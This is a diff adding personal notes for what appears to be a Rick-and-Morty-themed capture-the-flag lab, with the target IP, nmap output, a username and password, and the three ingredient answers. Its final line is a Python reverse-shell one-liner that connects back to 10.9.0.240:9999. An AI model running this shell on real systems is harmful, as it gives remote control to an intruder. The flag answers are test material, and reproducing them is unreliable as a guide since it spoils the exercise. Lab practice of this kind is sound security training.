@@ -1,0 +1,25 @@
+
+
+Machine IP: 10.10.155.106
+
+Nmap results:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack
+80/tcp open  http    syn-ack
+
+
+Username: R1ckRul3s
+Wubbalubbadubdub
+
+
+Questions:
+1.What is the first ingredient Rick needs?
+mr. meeseek hair
+
+2. What is the second ingredient?
+1 jerry tear
+
+3. What is the final ingredient?
+fleeb juice
+
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.240",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
